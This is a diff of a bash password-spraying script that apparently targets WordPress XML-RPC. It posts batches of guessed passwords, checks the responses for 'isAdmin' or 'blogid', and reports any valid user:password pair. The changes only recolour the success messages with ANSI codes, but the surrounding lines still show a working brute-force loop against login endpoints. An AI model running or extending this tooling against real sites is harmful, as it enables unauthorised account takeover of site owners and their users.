@@ -93,8 +93,8 @@ while IFS= read -r PASS; do
           -d @/tmp/spray_single.xml 2>&1)
         
         if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
-          echo "[+] Found password: $PASSWORD"
-          echo "CREDENTIALS FOUND: $USER:$PASSWORD"
+          echo -e "\033[1;32m[+] Valid Password: $PASSWORD\033[0m"
+          echo -e "\033[1;32m[+] Credentials: $USER:$PASSWORD\033[0m"
           break
         fi
       done <<< "$LAST_BATCH"
@@ -180,8 +180,8 @@ if [ $COUNTER -gt 0 ] && [ $SUCCESS -eq 0 ]; then
         -d @/tmp/spray_single.xml 2>&1)
       
       if echo "$RESPONSE" | grep -q "isAdmin\|blogid\|url"; then
-        echo "[+] Found password: $PASSWORD"
-        echo "CREDENTIALS FOUND: $USER:$PASSWORD"
+        echo -e "\033[1;32m[+] Valid Password: $PASSWORD\033[0m"
+        echo -e "\033[1;32m[+] Credentials: $USER:$PASSWORD\033[0m"
         break
       fi
     done <<< "$LAST_BATCH"
@@ -195,7 +195,7 @@ echo "[*] Brute-force complete."
 echo "[*] Total passwords tested: $TOTAL"
 echo "[*] Total batches sent: $BATCH_NUM"
 if [ $SUCCESS -eq 1 ]; then
-  echo "[!] CREDENTIALS FOUND!"
+  echo -e "\033[1;32m[!] CREDENTIALS FOUND!\033[0m"
 else
   echo "[-] No valid credentials found in this wordlist."
 fi
